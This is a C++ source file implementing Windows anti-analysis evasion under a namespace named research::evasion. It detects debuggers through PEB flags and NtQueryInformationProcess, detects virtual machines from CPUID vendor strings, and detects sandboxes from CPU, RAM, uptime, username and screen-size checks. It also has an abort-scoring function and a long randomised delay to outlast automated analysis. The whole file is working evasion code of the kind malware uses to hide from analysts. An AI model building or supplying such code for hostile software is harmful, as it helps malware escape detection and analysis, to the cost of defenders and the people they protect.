#include "evasion/evasion.hpp"

#include <windows.h>
#include <winternl.h>

#if defined(_MSC_VER)
#include <intrin.h>
#endif

#include <chrono>
#include <cstdint>
#include <cstring>
#include <random>
#include <thread>

namespace research::evasion {

namespace {

// Minimal PEB read for NtGlobalFlag / BeingDebugged on x64.
// GS:[0x60] = PEB
#pragma pack(push, 1)
struct PebMinimal {
    uint8_t  InheritedAddressSpace;
    uint8_t  ReadImageFileExecOptions;
    uint8_t  BeingDebugged;
    uint8_t  BitField;
    uint64_t Mutant;
    uint64_t ImageBaseAddress;
    uint64_t Ldr;
    uint64_t ProcessParameters;
    uint64_t SubSystemData;
    uint64_t ProcessHeap;
    uint64_t FastPebLock;
    uint64_t AtlThunkSListPtr;
    uint64_t IFEOKey;
    uint32_t CrossProcessFlags;
    uint8_t  pad1[4];
    uint64_t KernelCallbackTable;
    uint32_t SystemReserved;
    uint32_t AtlThunkSListPtr32;
    uint64_t ApiSetMap;
    uint32_t TlsExpansionCounter;
    uint8_t  pad2[4];
    uint64_t TlsBitmap;
    uint32_t TlsBitmapBits[2];
    uint64_t ReadOnlySharedMemoryBase;
    uint64_t HotpatchInformation;
    uint64_t ReadOnlyStaticServerData;
    uint64_t AnsiCodePageData;
    uint64_t OemCodePageData;
    uint64_t UnicodeCaseTableData;
    uint32_t NumberOfProcessors;
    uint32_t NtGlobalFlag; // offset 0xBC on x64
};
#pragma pack(pop)

PebMinimal* GetPeb() {
    PebMinimal* peb = nullptr;
#if defined(_MSC_VER)
    peb = reinterpret_cast<PebMinimal*>(__readgsqword(0x60));
#elif defined(__x86_64__) || defined(_M_X64)
    __asm__ volatile ("movq %%gs:0x60, %0" : "=r"(peb));
#elif defined(_M_IX86)
    __asm__ volatile ("movl %%fs:0x30, %0" : "=r"(peb));
#endif
    return peb;
}

bool CpuidHypervisorBit() {
#if defined(_MSC_VER)
    int regs[4] = {};
    __cpuid(regs, 1);
    return (regs[2] & (1 << 31)) != 0;
#elif defined(__x86_64__) || defined(_M_X64)
    unsigned int eax = 0, ebx = 0, ecx = 0, edx = 0;
    __asm__ volatile (
        "cpuid"
        : "=a"(eax), "=b"(ebx), "=c"(ecx), "=d"(edx)
        : "a"(1)
    );
    return (ecx & (1U << 31)) != 0;
#else
    return false;
#endif
}

} // namespace

bool IsVmDetected() {
#if defined(_MSC_VER)
    int regs[4] = {};
    __cpuid(regs, 0x40000000);
    char vendor[13] = {};
    std::memcpy(vendor, &regs[1], 4);
    std::memcpy(vendor + 4, &regs[2], 4);
    std::memcpy(vendor + 8, &regs[3], 4);
    vendor[12] = '\0';

    const char* suspects[] = { "VMware", "VBox", "KVM", "Xen", "QEMU", "Bochs" };
    for (const char* s : suspects) {
        if (std::strstr(vendor, s) != nullptr) {
            return true;
        }
    }
#elif defined(__x86_64__) || defined(_M_X64)
    unsigned int regs[4] = {0};
    __asm__ volatile (
        "cpuid"
        : "=a"(regs[0]), "=b"(regs[1]), "=c"(regs[2]), "=d"(regs[3])
        : "a"(0x40000000)
    );
    char vendor[13] = {};
    std::memcpy(vendor, &regs[1], 4);
    std::memcpy(vendor + 4, &regs[2], 4);
    std::memcpy(vendor + 8, &regs[3], 4);
    vendor[12] = '\0';

    const char* suspects[] = { "VMware", "VBox", "KVM", "Xen", "QEMU", "Bochs" };
    for (const char* s : suspects) {
        if (std::strstr(vendor, s) != nullptr) {
            return true;
        }
    }
#endif
    return false;
}

bool IsDebuggerDetected() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        auto nt_query = reinterpret_cast<NTSTATUS(NTAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG)>(
            GetProcAddress(ntdll, "NtQueryInformationProcess"));

        if (nt_query) {
            // ProcessDebugPort = 7
            HANDLE debug_port = nullptr;
            ULONG ret_len = 0;
            if (NT_SUCCESS(nt_query(GetCurrentProcess(), static_cast<PROCESSINFOCLASS>(7), &debug_port, sizeof(debug_port), &ret_len))) {
                if (debug_port != nullptr) {
                    return true;
                }
            }

            // ProcessDebugObjectHandle = 30 (0x1E)
            HANDLE debug_obj = nullptr;
            ret_len = 0;
            if (NT_SUCCESS(nt_query(GetCurrentProcess(), static_cast<PROCESSINFOCLASS>(30), &debug_obj, sizeof(debug_obj), &ret_len))) {
                if (debug_obj != nullptr) {
                    return true;
                }
            }
        }
    }

    if (IsDebuggerPresent()) {
        return true;
    }

    PebMinimal* peb = GetPeb();
    if (peb && (peb->NtGlobalFlag & 0x70)) {
        return true;
    }

    return false;
}

bool IsSandboxDetected() {
    // CPU count < 2
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }

    // RAM < 2 GB (sandboxes are often starved; real workstations usually have 8+)
    MEMORYSTATUSEX mem = { sizeof(mem) };
    if (GlobalMemoryStatusEx(&mem)) {
        if (mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
            return true;
        }
    }

    // Uptime < 1 hour
    ULONGLONG ticks = GetTickCount64();
    if (ticks < 3600ULL * 1000) {
        return true;
    }

    // Username check
    char username[256] = {};
    DWORD len = 256;
    if (GetUserNameA(username, &len)) {
        const char* bad[] = { "admin", "user", "test", "student", "sandbox", "vm", "virtual" };
        for (const char* b : bad) {
            if (std::strstr(username, b) != nullptr) {
                return true;
            }
        }
    }

    // Resolution < 1024x768
    if (GetSystemMetrics(SM_CXSCREEN) < 1024 || GetSystemMetrics(SM_CYSCREEN) < 768) {
        return true;
    }

    return false;
}

bool ShouldAbort() {
    // Require at least two signals before aborting to reduce false positives.
    int score = 0;
    if (IsVmDetected()) ++score;
    if (IsDebuggerDetected()) ++score;
    if (IsSandboxDetected()) ++score;
    return score >= 2;
}

void JitterDelay() {
    std::random_device rd;
    std::mt19937 gen(rd());

    // Phase 1: long initial delay (30–120 s)
    std::uniform_int_distribution<> long_dist(30000, 120000);
    std::this_thread::sleep_for(std::chrono::milliseconds(long_dist(gen)));

    // Phase 2: three micro-delays (1–5 s each)
    std::uniform_int_distribution<> short_dist(1000, 5000);
    for (int i = 0; i < 3; ++i) {
        std::this_thread::sleep_for(std::chrono::milliseconds(short_dist(gen)));
    }
}

} // namespace research::evasion
